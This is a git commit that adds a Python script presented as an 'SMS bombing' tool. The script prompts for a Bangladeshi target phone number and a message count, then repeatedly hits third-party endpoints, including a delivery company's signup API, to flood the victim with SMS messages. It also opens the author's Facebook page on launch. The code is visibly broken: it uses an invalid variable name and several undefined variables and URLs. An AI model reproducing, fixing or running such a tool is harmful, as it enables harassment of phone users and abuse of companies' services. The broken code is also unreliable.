1c52c4ef25cc98277242c6ba3f2773ad54eac8e2
AK-40 <149156179+AK-40@users.noreply.github.com>
2023-11-11 12:41:18 +0600

    Create AK-40.py
    git clone https://github.com/AK-40/BOMNING-TOOLS.git
    cd BOMNING-TOOLS
    git pull 
    python AK-40.py

---
+++ AK-40.py
@@ -0,0 +1,87 @@
+import requests,os
+os.system("clear")
+AK-40="""
+   \033[1;33m✧☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
+   ☆ \033[1;34mᴡᴇʟᴄᴏᴍᴇ & ᴇɴᴊᴏʏ ᴛʜɪꜱ ᴛᴏᴏʟ \033[1;33m☆ 
+   ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
+\033[1;35m╔═════════════════════════════════╗
+║   \033[1;31m               AAA                    KKKKKKKKK    KKKKKKK       \033[1;35m║
+║   \033[1;31m              A:::A                   K:::::::K    K:::::               \033[1;35m║
+║   \033[1;31m             A:::::A                  K:::::::K    K:::::K                    \033[1;35m║
+║   \033[1;31m            A:::::::A                 K:::::::K   K::::::K             \033[1;35m║
+║   \033[1;31m           A:::::::::A                KK::::::K  K:::::KKK        \033[1;35m║
+║   \033[1;31m          A:::::A:::::A                 K:::::K K:::::K             \033[1;35m║
+║   \033[1;31m         A:::::A A:::::A                K::::::K:::::K              \033[1;35m║
+║   \033[1;31m        A:::::A   A:::::A               K:::::::::::K                \033[1;35m║
+║   \033[1;31m       A:::::A     A:::::A              K:::::::::::K                \033[1;35m║
+║   \033[1;31m      A:::::AAAAAAAAA:::::A             K::::::K:::::K   \033[1;35m║
+║   \033[1;31m     A:::::::::::::::::::::A            K:::::K K:::::K              \033[1;35m║
+║   \033[1;31m    A:::::AAAAAAAAAAAAA:::::A         KK::::::K  K:::::\033[1;35m║
+║   \033[1;31m   A:::::A             A:::::A        K:::::::K   K::::::K               \033[1;35m║
+║   \033[1;31m  A:::::A               A:::::A       K:::::::K    K:::::K               \033[1;35m║
+║   \033[1;31m A:::::A                 A:::::A      K:::::::K    K:::::K               \033[1;35m║
+║   \033[1;31mAAAAAAA                   AAAAAAA     KKKKKKKKK  \033[1;35m║
+\033[1;35m║        \033[1;36m ☞AK-40☜ \033[1;35m           ║\033[1;35m
+\033[1;35m╠═════════════════════════════════╣
+\033[1;35m║\033[1;33m  ADMIN    :   AK-40       \033[1;35m║
+\033[1;35m║ \033[1;32m TOOLS    :   SMS BOMBING       \033[1;35m║
+\033[1;35m║ \033[1;34m GITHUB   :    AK-40         \033[1;35m║
+\033[1;35m╚═════════════════════════════════╝
+╔═════════════════════════════════╗
+║    \033[1;37m S.D.S TEAM\033[1;37m    \033[1;35m ║\033[1;35m
+╚═════════════════════════════════╝
+"""
+print(ajmir)
+os.system("xdg-open https://www.facebook.com/Ajmir.Hossain.008 ")
+nmbr=input("\033[1;31mENTER TARGET NUMBER : +880")
+total=int(input("\033[1;33m ENTER SMS AMMOUNT  : "))
+print("""\033[1;32m\n\nWAIT FEW SECOND AND SEE
+↘""")
+headers = {
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=UYVEZchmSs2e1RoDcW_3dEXy; sb=UYVEZRy9bDvJYBDD7X0WOpw7',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23021RAAEG"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
+count=0
+while total>count:
+  send1=requests.get(url1,headers=headers1)
+  if send1.status_code==200:
+    count+=1
+    print(f"{count} SMS SENT √")
+  else:
+    pass
+  send2=requests.get(url2,headers=headers2)
+  if send2.status_code==200:
+    count+=1
+    print(f"{count} SMS SENT √")
+  else:
+    pass
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    count+=1
+    print(f"{count} SMS SENT √")
+    
+  else:
+    pass
+print("""\033[1;35m
+………………………………………………………………………………………………
+  \033[1;36m  ʕ•ᴥ•ʔ ALL SMS SENT DONE ʕ•ᴥ•ʔ\033[1;35m  
+………………………………………………………………………………………………
+""")
